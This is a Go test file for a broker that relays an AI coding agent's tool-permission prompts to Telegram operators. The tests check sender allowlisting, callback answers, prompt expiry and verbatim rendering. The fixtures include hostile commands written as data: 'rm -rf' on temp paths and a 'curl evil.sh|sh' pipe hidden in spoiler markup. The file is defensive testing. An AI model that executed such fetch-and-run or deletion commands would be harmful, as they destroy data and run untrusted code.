package broker

import (
	"encoding/json"
	"net"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Andrometiq/c3/internal/c3types"
	"github.com/Andrometiq/c3/internal/ipc"
	"github.com/Andrometiq/c3/internal/mappings"
)

const testOperatorUID = int64(42857190)

// answeredCallback records one AnswerCallback the broker delivered through the
// channel — the per-tap outcome feedback (toast/alert) for a deferred perm ack.
type answeredCallback struct {
	CallbackID string
	Text       string
	ShowAlert  bool
}

// permFakeChannel is fakeChannel plus the OPTIONAL callbackAnswerer capability,
// so perm tests can assert that EVERY tap outcome answers the callback query
// (the telegram channel defers the ack of "perm:" taps to the broker).
type permFakeChannel struct {
	fakeChannel
	ansMu   sync.Mutex
	answers []answeredCallback
}

func (f *permFakeChannel) AnswerCallback(callbackID, text string, showAlert bool) error {
	f.ansMu.Lock()
	defer f.ansMu.Unlock()
	f.answers = append(f.answers, answeredCallback{callbackID, text, showAlert})
	return nil
}

func (f *permFakeChannel) answersSnapshot() []answeredCallback {
	f.ansMu.Lock()
	defer f.ansMu.Unlock()
	out := make([]answeredCallback, len(f.answers))
	copy(out, f.answers)
	return out
}

// brokerWithPermChannel mirrors brokerWithChannel but registers the
// AnswerCallback-capable fake (the embedded fakeChannel would otherwise be
// registered by value-of-interface and lose the method set).
func brokerWithPermChannel(t *testing.T, mf *mappings.MappingsFile, fc *permFakeChannel) *Broker {
	t.Helper()
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	b := New(mf)
	b.chMu.Lock()
	b.channels[fc.Name()] = &channelRegistration{Channel: fc}
	b.chMu.Unlock()
	return b
}

// permBrokerWithOperator builds a broker whose allowlist clears testOperatorUID
// as a DM operator (the sender-gate set for permission relay), plus a holder
// stub claiming `key` whose conn is the broker side of a pipe. Returns the
// broker, the permFakeChannel, and the agent-side conn (the test reads pushed
// verdicts from it).
func permBrokerWithOperator(t *testing.T, key RouteKey) (*Broker, *permFakeChannel, *ipc.Conn) {
	t.Helper()
	mf := mfWithTelegram()
	mf.AddAllowedUser(testOperatorUID)
	fc := &permFakeChannel{fakeChannel: fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}}
	b := brokerWithPermChannel(t, mf, fc)

	agentSide, brokerSide := net.Pipe()
	t.Cleanup(func() { _ = agentSide.Close(); _ = brokerSide.Close() })
	agentConn := ipc.NewConn(agentSide)
	stub := b.Stubs.Register("claude", 4242, "/work", ipc.NewConn(brokerSide))
	if _, ok := b.Routes.Claim(key, stub); !ok {
		t.Fatal("claim failed")
	}
	stub.SetRoute(&key)
	return b, fc, agentConn
}

// TestResolvePerm_AllowDeny drives the broker-side permission resolution: a
// registered pendingPerm, tapped by the operator with "perm:allow:<id>",
// resolves with behavior "allow" pushed to the holder conn as an
// OpPermissionVerdict and the message edited + keyboard cleared. An unknown id
// returns false. A second tap (already-resolved) returns false.
func TestResolvePerm_AllowDeny(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, agentConn := permBrokerWithOperator(t, key)
	defer b.Shutdown()

	b.Perms.register(&pendingPerm{requestID: "abcde", route: key, toolName: "Bash", preview: "rm -rf /tmp/x", messageID: 77})

	// A non-perm callback must NOT resolve a perm (generic event path proceeds).
	if b.resolvePerm(key, &c3types.CallbackEvent{Data: "ask:abcde:0", Actor: c3types.Sender{UserID: testOperatorUID}}) {
		t.Fatal("a non-perm callback must not resolve a perm")
	}
	// A perm callback for an UNKNOWN id must NOT resolve and must leave our live perm.
	if b.resolvePerm(key, &c3types.CallbackEvent{Data: "perm:allow:zzzzz", Actor: c3types.Sender{UserID: testOperatorUID}}) {
		t.Fatal("a callback for an unknown perm id must not resolve")
	}
	if !b.Perms.has("abcde") {
		t.Fatal("a non-matching callback must leave the pending perm registered")
	}

	// Start the holder reader BEFORE resolving (net.Pipe writes block until read).
	done := make(chan ipc.PermissionVerdictMsg, 1)
	go func() {
		raw, err := agentConn.ReadFrame()
		if err != nil {
			close(done)
			return
		}
		var m ipc.PermissionVerdictMsg
		_ = json.Unmarshal(raw, &m)
		done <- m
	}()

	if !b.resolvePerm(key, &c3types.CallbackEvent{Data: "perm:allow:abcde", MessageID: 77, Actor: c3types.Sender{UserID: testOperatorUID}}) {
		t.Fatal("a matching operator perm tap must resolve (and suppress the generic event)")
	}

	select {
	case m, ok := <-done:
		if !ok {
			t.Fatal("holder conn read failed before an OpPermissionVerdict was pushed")
		}
		if m.Op != ipc.OpPermissionVerdict {
			t.Fatalf("pushed op = %q, want %q", m.Op, ipc.OpPermissionVerdict)
		}
		if m.RequestID != "abcde" {
			t.Fatalf("request id = %q, want abcde", m.RequestID)
		}
		if m.Behavior != "allow" {
			t.Fatalf("behavior = %q, want allow", m.Behavior)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("no OpPermissionVerdict pushed to the holder conn")
	}

	if b.Perms.has("abcde") {
		t.Fatal("a resolved perm must be removed from the registry")
	}
	edits := fc.editSnapshot()
	if len(edits) != 1 {
		t.Fatalf("resolve should edit the message exactly once (mark + clear keyboard); got %d", len(edits))
	}
	if edits[0].MessageID != 77 {
		t.Fatalf("edit targeted message %d, want 77", edits[0].MessageID)
	}
	if edits[0].Buttons == nil || len(edits[0].Buttons) != 0 {
		t.Fatalf("resolve must clear the keyboard via a non-nil empty Buttons; got %+v", edits[0].Buttons)
	}
	if !strings.Contains(edits[0].Text, "Allowed") {
		t.Fatalf("resolve edit body should record the verdict; got %q", edits[0].Text)
	}
	// The edited body must RETAIN the request context (tool + input preview) so the
	// chat keeps a durable record of what was permitted — not collapse to a bare verdict.
	if !strings.Contains(edits[0].Text, "Bash") || !strings.Contains(edits[0].Text, "rm -rf /tmp/x") {
		t.Fatalf("resolve edit body should retain the tool + preview; got %q", edits[0].Text)
	}

	// A second (stale) tap for the already-resolved perm must NOT resolve.
	if b.resolvePerm(key, &c3types.CallbackEvent{Data: "perm:allow:abcde", Actor: c3types.Sender{UserID: testOperatorUID}}) {
		t.Fatal("a stale tap for an already-resolved perm must return false")
	}
}

// TestResolvePerm_Deny: a "perm:deny:<id>" operator tap resolves with behavior
// "deny" and records a Denied outcome.
func TestResolvePerm_Deny(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, agentConn := permBrokerWithOperator(t, key)
	defer b.Shutdown()

	b.Perms.register(&pendingPerm{requestID: "bcdef", route: key, toolName: "Write", messageID: 8})

	done := make(chan ipc.PermissionVerdictMsg, 1)
	go func() {
		raw, err := agentConn.ReadFrame()
		if err != nil {
			close(done)
			return
		}
		var m ipc.PermissionVerdictMsg
		_ = json.Unmarshal(raw, &m)
		done <- m
	}()

	if !b.resolvePerm(key, &c3types.CallbackEvent{Data: "perm:deny:bcdef", MessageID: 8, Actor: c3types.Sender{UserID: testOperatorUID}}) {
		t.Fatal("a matching operator deny tap must resolve")
	}
	select {
	case m := <-done:
		if m.Behavior != "deny" {
			t.Fatalf("behavior = %q, want deny", m.Behavior)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("no verdict pushed")
	}
	edits := fc.editSnapshot()
	if len(edits) != 1 || !strings.Contains(edits[0].Text, "Denied") {
		t.Fatalf("deny edit body should record Denied; got %+v", edits)
	}
}

// TestResolvePerm_NonOperatorIgnored: a tap from a user who is NOT an
// allowlisted operator must NOT be honored — no verdict pushed, no message
// edited, and the pending perm stays live so the real operator can still
// approve. resolvePerm returns false (the tap is already auto-acked).
func TestResolvePerm_NonOperatorIgnored(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, agentConn := permBrokerWithOperator(t, key)
	defer b.Shutdown()

	b.Perms.register(&pendingPerm{requestID: "cdefg", route: key, toolName: "Bash", messageID: 9})

	// Any unexpected write to the holder conn would block; guard with a reader
	// that records whether anything arrived.
	got := make(chan struct{}, 1)
	go func() {
		if _, err := agentConn.ReadFrame(); err == nil {
			got <- struct{}{}
		}
	}()

	const intruderUID = int64(99999999)
	if b.resolvePerm(key, &c3types.CallbackEvent{Data: "perm:allow:cdefg", MessageID: 9, Actor: c3types.Sender{UserID: intruderUID}}) {
		t.Fatal("a non-operator tap must NOT be honored (resolvePerm must return false)")
	}
	if !b.Perms.has("cdefg") {
		t.Fatal("a non-operator tap must leave the pending perm live for the real operator")
	}
	select {
	case <-got:
		t.Fatal("a non-operator tap must not push a verdict to the holder")
	case <-time.After(150 * time.Millisecond):
	}
	if len(fc.editSnapshot()) != 0 {
		t.Fatal("a non-operator tap must not edit the message")
	}
}

// TestResolvePerm_NonOperatorTap_AnswersNotAuthorized is the 2026-06-30 live-bug
// regression (fresh install, group-paired only, so the tapper is NOT in the
// DM-cleared operator set): the Allow tap must still be REFUSED (security
// property — verdicts only from allowlisted operators), but it must never again
// be a silent no-op. The telegram channel defers the "perm:" ack to the broker,
// so resolvePerm must answer the callback with an explicit not-authorized
// alert while leaving the pending perm live for the real operator.
func TestResolvePerm_NonOperatorTap_AnswersNotAuthorized(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, _ := permBrokerWithOperator(t, key)
	defer b.Shutdown()

	b.Perms.register(&pendingPerm{requestID: "fghij", route: key, toolName: "Bash", messageID: 11})

	const intruderUID = int64(99999999)
	if b.resolvePerm(key, &c3types.CallbackEvent{
		CallbackID: "cbq-intruder", Data: "perm:allow:fghij", MessageID: 11,
		Actor: c3types.Sender{UserID: intruderUID},
	}) {
		t.Fatal("a non-operator tap must NOT be honored")
	}
	if !b.Perms.has("fghij") {
		t.Fatal("a non-operator tap must leave the pending perm live")
	}
	answers := fc.answersSnapshot()
	if len(answers) != 1 {
		t.Fatalf("a non-operator tap must answer the deferred callback exactly once (silent drop = the live bug); got %d answers", len(answers))
	}
	if answers[0].CallbackID != "cbq-intruder" {
		t.Fatalf("answered wrong callback id %q, want cbq-intruder", answers[0].CallbackID)
	}
	if !strings.Contains(answers[0].Text, "Not authorized") {
		t.Fatalf("not-authorized feedback must say so; got %q", answers[0].Text)
	}
	if !answers[0].ShowAlert {
		t.Fatal("not-authorized feedback should be an alert (a toast is too easy to miss)")
	}
}

// TestResolvePerm_TapOutcomes_AllAnswered pins the full deferred-ack contract:
// resolved (allow), unknown/expired id, wrong route, and a malformed payload in
// the perm namespace each answer the callback — no branch may leave a tap
// unanswered (the channel skipped its auto-ack for every "perm:" tap).
func TestResolvePerm_TapOutcomes_AllAnswered(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	other := RouteKey{Channel: "telegram", ChatID: -100, TopicID: 281, HasTopic: true}
	b, fc, agentConn := permBrokerWithOperator(t, key)
	defer b.Shutdown()

	// Drain holder pushes so verdict writes never block the resolution under test.
	go func() {
		for {
			if _, err := agentConn.ReadFrame(); err != nil {
				return
			}
		}
	}()

	op := c3types.Sender{UserID: testOperatorUID}

	// 1. Unknown / already-resolved id → "no longer active".
	if b.resolvePerm(key, &c3types.CallbackEvent{CallbackID: "cb-unknown", Data: "perm:allow:zzzzz", Actor: op}) {
		t.Fatal("unknown id must not resolve")
	}
	// 2. Malformed payload inside the perm namespace → answered (bare ack).
	if b.resolvePerm(key, &c3types.CallbackEvent{CallbackID: "cb-malformed", Data: "perm:bogus:abcde", Actor: op}) {
		t.Fatal("malformed perm payload must not resolve")
	}
	// 3. Wrong route → answered, perm re-registered.
	b.Perms.register(&pendingPerm{requestID: "klmno", route: other, toolName: "Bash", messageID: 12})
	if b.resolvePerm(key, &c3types.CallbackEvent{CallbackID: "cb-wrongroute", Data: "perm:allow:klmno", Actor: op}) {
		t.Fatal("wrong-route tap must not resolve")
	}
	if !b.Perms.has("klmno") {
		t.Fatal("wrong-route tap must re-register the perm")
	}
	// 4. Operator allow → resolved with a verdict toast.
	b.Perms.register(&pendingPerm{requestID: "pqrst", route: key, toolName: "Bash", messageID: 13})
	if !b.resolvePerm(key, &c3types.CallbackEvent{CallbackID: "cb-allow", Data: "perm:allow:pqrst", MessageID: 13, Actor: op}) {
		t.Fatal("operator allow tap must resolve")
	}

	answers := fc.answersSnapshot()
	if len(answers) != 4 {
		t.Fatalf("every perm-tap outcome must answer the callback; got %d answers: %+v", len(answers), answers)
	}
	byID := map[string]answeredCallback{}
	for _, a := range answers {
		byID[a.CallbackID] = a
	}
	if a := byID["cb-unknown"]; !strings.Contains(a.Text, "no longer active") {
		t.Errorf("unknown-id answer should say the prompt is gone; got %q", a.Text)
	}
	if _, ok := byID["cb-malformed"]; !ok {
		t.Error("malformed perm payload must still be answered (bare ack)")
	}
	if a := byID["cb-wrongroute"]; a.Text == "" {
		t.Error("wrong-route answer should carry a notice")
	}
	if a := byID["cb-allow"]; !strings.Contains(a.Text, "Allowed") {
		t.Errorf("allow answer should confirm the verdict; got %q", a.Text)
	}
}

// TestHandlePermissionRequest_NoOperatorHint covers the fresh-install prompt
// hardening: with an EMPTY DM-cleared operator set NO tap can ever pass the
// resolvePerm sender-gate, so the relayed prompt must say so (instead of
// rendering Allow/Deny buttons that silently do nothing). With an operator
// paired, no hint appears.
func TestHandlePermissionRequest_NoOperatorHint(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}

	// No allowlisted users → hint present.
	mf := mfWithTelegram()
	fc := &fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}
	b := brokerWithChannel(t, mf, fc)
	defer b.Shutdown()
	stub := b.Stubs.Register("claude", 1, "/work", nil)
	if _, ok := b.Routes.Claim(key, stub); !ok {
		t.Fatal("claim failed")
	}
	stub.SetRoute(&key)
	b.handlePermissionRequest(nil, stub, mustMarshalJSON(t, ipc.PermissionReq{
		Op: ipc.OpPermissionRequest, RequestID: "abcde", ToolName: "Bash",
	}))
	replies := fc.sendRepliesSnapshot()
	if len(replies) != 1 {
		t.Fatalf("expected 1 prompt send; got %d", len(replies))
	}
	if !strings.Contains(replies[0].Text, "No operator is DM-paired") {
		t.Fatalf("empty operator set must surface the pairing hint on the prompt; got %q", replies[0].Text)
	}

	// Operator paired → no hint.
	mf2 := mfWithTelegram()
	mf2.AddAllowedUser(testOperatorUID)
	fc2 := &fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}
	b2 := brokerWithChannel(t, mf2, fc2)
	defer b2.Shutdown()
	stub2 := b2.Stubs.Register("claude", 2, "/work", nil)
	if _, ok := b2.Routes.Claim(key, stub2); !ok {
		t.Fatal("claim failed")
	}
	stub2.SetRoute(&key)
	b2.handlePermissionRequest(nil, stub2, mustMarshalJSON(t, ipc.PermissionReq{
		Op: ipc.OpPermissionRequest, RequestID: "bcdef", ToolName: "Bash",
	}))
	replies2 := fc2.sendRepliesSnapshot()
	if len(replies2) != 1 {
		t.Fatalf("expected 1 prompt send; got %d", len(replies2))
	}
	if strings.Contains(replies2[0].Text, "No operator is DM-paired") {
		t.Fatalf("with a paired operator the hint must NOT appear; got %q", replies2[0].Text)
	}
}

// TestPermRegistry_ExpiresStale drives the perm reaper: a pendingPerm older than
// permExpiryTTL is removed by sweepExpiredPerms, which best-effort clears its
// live keyboard; a fresh perm survives.
func TestPermRegistry_ExpiresStale(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	mf := mfWithTelegram()
	fc := &fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}
	b := brokerWithChannel(t, mf, fc)
	defer b.Shutdown()

	stale := &pendingPerm{
		requestID: "stale", route: key, toolName: "Bash", messageID: 55,
		createdAt: time.Now().Add(-permExpiryTTL - time.Minute),
	}
	if !b.registerPerm(stale) {
		t.Fatal("register stale failed")
	}
	fresh := &pendingPerm{
		requestID: "fresh", route: key, toolName: "Read", messageID: 66, createdAt: time.Now(),
	}
	if !b.registerPerm(fresh) {
		t.Fatal("register fresh failed")
	}

	b.sweepExpiredPerms()

	if b.Perms.has("stale") {
		t.Fatal("a stale perm must be removed by the sweep")
	}
	if !b.Perms.has("fresh") {
		t.Fatal("a fresh perm must survive the sweep")
	}
	edits := fc.editSnapshot()
	if len(edits) != 1 {
		t.Fatalf("sweep must clear exactly the stale perm's keyboard (1 edit); got %d", len(edits))
	}
	if edits[0].MessageID != 55 {
		t.Fatalf("sweep edit targeted msg %d, want 55", edits[0].MessageID)
	}
	if edits[0].Buttons == nil || len(edits[0].Buttons) != 0 {
		t.Fatalf("sweep must clear the keyboard via a non-nil empty Buttons; got %+v", edits[0].Buttons)
	}
}

// TestHandlePermissionRequest_SendsKeyboard drives the broker handler: a valid
// OpPermissionRequest on a claimed route registers a pendingPerm (before send),
// sends the Allow/Deny keyboard, and stores the sent message id. No ack frame is
// written (fire-and-forget — there is no blocking tool to unblock).
func TestHandlePermissionRequest_SendsKeyboard(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	mf := mfWithTelegram()
	fc := &fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}
	b := brokerWithChannel(t, mf, fc)
	defer b.Shutdown()

	stub := b.Stubs.Register("claude", 1, "/work", nil)
	if _, ok := b.Routes.Claim(key, stub); !ok {
		t.Fatal("claim failed")
	}
	stub.SetRoute(&key)

	raw := mustMarshalJSON(t, ipc.PermissionReq{
		Op: ipc.OpPermissionRequest, RequestID: "abcde", ToolName: "Bash", Preview: "rm -rf /tmp/x",
	})
	b.handlePermissionRequest(nil, stub, raw)

	if !b.Perms.has("abcde") {
		t.Fatal("a valid permission_request must register a pending perm")
	}
	replies := fc.sendRepliesSnapshot()
	if len(replies) != 1 {
		t.Fatalf("handler must send exactly one keyboard message; got %d", len(replies))
	}
	if !strings.Contains(replies[0].Text, "Bash") {
		t.Fatalf("prompt text should name the tool; got %q", replies[0].Text)
	}
	if len(replies[0].Buttons) == 0 {
		t.Fatal("handler must attach the Allow/Deny inline keyboard")
	}
	// Flatten and assert both verbs are present in callback data.
	var datas []string
	for _, row := range replies[0].Buttons {
		for _, btn := range row {
			datas = append(datas, btn.Data)
		}
	}
	joined := strings.Join(datas, " ")
	if !strings.Contains(joined, "perm:allow:abcde") || !strings.Contains(joined, "perm:deny:abcde") {
		t.Fatalf("keyboard must carry perm:allow / perm:deny callbacks; got %v", datas)
	}
}

// TestHandlePermissionRequest_NoRouteDrops: a permission_request with no claimed
// route is dropped (logged) without registering or sending — there is no blocking
// tool to error.
func TestHandlePermissionRequest_NoRouteDrops(t *testing.T) {
	mf := mfWithTelegram()
	fc := &fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}
	b := brokerWithChannel(t, mf, fc)
	defer b.Shutdown()

	stub := b.Stubs.Register("claude", 1, "/work", nil) // no route claimed
	raw := mustMarshalJSON(t, ipc.PermissionReq{
		Op: ipc.OpPermissionRequest, RequestID: "abcde", ToolName: "Bash",
	})
	b.handlePermissionRequest(nil, stub, raw)

	if b.Perms.has("abcde") {
		t.Fatal("a routeless permission_request must not register a pending perm")
	}
	if len(fc.sendRepliesSnapshot()) != 0 {
		t.Fatal("a routeless permission_request must not send anything")
	}
}

func mustMarshalJSON(t *testing.T, v any) []byte {
	t.Helper()
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return raw
}

// TestParsePermCallback covers the callback_data parser.
func TestParsePermCallback(t *testing.T) {
	cases := []struct {
		data    string
		wantID  string
		wantBeh string
		wantOK  bool
	}{
		{"perm:allow:abcde", "abcde", "allow", true},
		{"perm:deny:abcde", "abcde", "deny", true},
		{"ask:abcde:0", "", "", false},
		{"perm:allow:", "", "", false},
		{"perm:bogus:abcde", "", "", false},
		{"perm:allow", "", "", false},
		{"", "", "", false},
	}
	for _, c := range cases {
		id, beh, ok := parsePermCallback(c.data)
		if id != c.wantID || beh != c.wantBeh || ok != c.wantOK {
			t.Errorf("parsePermCallback(%q) = (%q,%q,%v); want (%q,%q,%v)",
				c.data, id, beh, ok, c.wantID, c.wantBeh, c.wantOK)
		}
	}
}

// TestPermResolvedText pins the durable post-verdict body: it must RETAIN the
// request context (tool + input preview) AND append a timestamped verdict line, so
// the chat keeps a record of what was permitted and when — for both allow and deny.
func TestPermResolvedText(t *testing.T) {
	at := time.Date(2026, 7, 7, 15, 4, 0, 0, time.UTC)
	allowed := permResolvedText("Bash", "rm -rf /tmp/x", "allow", at)
	if !strings.Contains(allowed, "Bash") || !strings.Contains(allowed, "rm -rf /tmp/x") {
		t.Errorf("resolved body must retain tool + preview; got %q", allowed)
	}
	if !strings.Contains(allowed, "✅ Allowed") || !strings.Contains(allowed, "15:04") {
		t.Errorf("resolved body must append the verdict + timestamp; got %q", allowed)
	}
	denied := permResolvedText("Write", "/etc/hosts", "deny", at)
	if !strings.Contains(denied, "Write") || !strings.Contains(denied, "/etc/hosts") {
		t.Errorf("resolved body must retain tool + preview; got %q", denied)
	}
	if !strings.Contains(denied, "❌ Denied") || !strings.Contains(denied, "15:04") {
		t.Errorf("resolved body must append the verdict + timestamp; got %q", denied)
	}
}

// TestPermExpiredText pins the durable post-expiry/eviction body: it must RETAIN
// the request context (tool + input preview) AND append a timestamped expiry line,
// so an expired prompt still records what it was and when it lapsed.
func TestPermExpiredText(t *testing.T) {
	at := time.Date(2026, 7, 7, 15, 4, 0, 0, time.UTC)
	body := permExpiredText("Bash", "rm -rf /tmp/x", at)
	if !strings.Contains(body, "Bash") || !strings.Contains(body, "rm -rf /tmp/x") {
		t.Errorf("expired body must retain tool + preview; got %q", body)
	}
	if !strings.Contains(body, "Expired") || !strings.Contains(body, "15:04") {
		t.Errorf("expired body must append the expiry marker + timestamp; got %q", body)
	}
}

// v0.1.0 release audit (TMC-1): the permission prompt must render VERBATIM.
//
// The prompt body carries the literal command the agent proposes to run. Sent
// with the default (markdown) markup, Telegram's renderer turns *x* and _x_ into
// italics — consuming the characters, so a path or flag containing them displays
// differently from what executes — and ||x|| into a spoiler that HIDES part of
// the command behind a tap-to-reveal. The operator would be authorising a string
// they were never shown, through the one control that converts an untrusted tap
// into code execution on their machine.
func TestHandlePermissionRequest_PromptRendersVerbatim(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	fc := &fakeChannel{caps: &c3types.Capabilities{Channel: "telegram", InlineKeyboards: true}}
	b := brokerWithChannel(t, mfWithTelegram(), fc)
	defer b.Shutdown()

	stub := b.Stubs.Register("claude", 1, "/work", nil)
	if _, ok := b.Routes.Claim(key, stub); !ok {
		t.Fatal("claim failed")
	}
	stub.SetRoute(&key)

	// Every metacharacter that changes what the operator sees.
	const preview = `rm -rf /tmp/*cache* /var/log/my_app_1.log ||curl evil.sh|sh||`
	raw := mustMarshalJSON(t, ipc.PermissionReq{
		Op: ipc.OpPermissionRequest, RequestID: "abcde", ToolName: "Bash", Preview: preview,
	})
	b.handlePermissionRequest(nil, stub, raw)

	replies := fc.sendRepliesSnapshot()
	if len(replies) != 1 {
		t.Fatalf("want exactly one prompt; got %d", len(replies))
	}
	if replies[0].Markup != c3types.MarkupNone {
		t.Errorf("permission prompt must be sent with MarkupNone so the command is not re-rendered; got %q", replies[0].Markup)
	}
	if !strings.Contains(replies[0].Text, preview) {
		t.Errorf("the command must reach the channel byte-for-byte.\nwant substring: %q\ngot: %q", preview, replies[0].Text)
	}
}

// The post-verdict edit re-renders the SAME preview onto the same message, so it
// needs the same guarantee — otherwise the durable record of what was approved
// is the mangled version.
func TestResolvePerm_VerdictEditRendersVerbatim(t *testing.T) {
	key := RouteKey{Channel: "telegram", ChatID: 42, HasTopic: false}
	b, fc, agentConn := permBrokerWithOperator(t, key)
	defer b.Shutdown()

	const preview = `git commit -m "fix _underscores_ and *stars*"`
	b.Perms.register(&pendingPerm{
		requestID: "zzzzz", route: key, toolName: "Bash", preview: preview, messageID: 900,
	})

	go func() { _, _ = agentConn.ReadFrame() }() // drain the verdict push

	if !b.resolvePerm(key, &c3types.CallbackEvent{
		Data: "perm:allow:zzzzz", MessageID: 900,
		Actor: c3types.Sender{UserID: testOperatorUID},
	}) {
		t.Fatal("an operator allow tap must resolve")
	}

	edits := fc.editSnapshot()
	if len(edits) == 0 {
		t.Fatal("resolving a perm must edit the prompt message")
	}
	last := edits[len(edits)-1]
	if last.Markup != c3types.MarkupNone {
		t.Errorf("verdict edit must use MarkupNone; got %q", last.Markup)
	}
	if !strings.Contains(last.Text, preview) {
		t.Errorf("the approved command must be recorded verbatim.\nwant substring: %q\ngot: %q", preview, last.Text)
	}
}
